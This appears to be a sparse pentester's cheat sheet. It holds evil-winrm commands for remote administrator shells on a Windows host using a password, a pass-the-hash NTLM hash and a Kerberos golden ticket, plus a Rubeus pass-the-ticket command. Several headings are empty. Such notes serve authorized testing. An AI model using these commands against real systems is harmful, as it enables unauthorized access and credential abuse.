# Enumeration 
# Exploitation 
## Shell 
```
evil-winrm -i 10.0.0.5 -u administrator -p Pass123
```
## PTH 
```
evil-winrm -i 10.0.0.5 -u administrator -H aabbccddeeff00112233445566778899

Rubeus.exe ptt /ticket:krb5cc_file
evil-winrm -i 10.0.0.5 -u administrator -p Pass -k # golden ticket 
```

## Unconstrained Delegation 
## Cert Bypass 
## Trusted Host Bypass
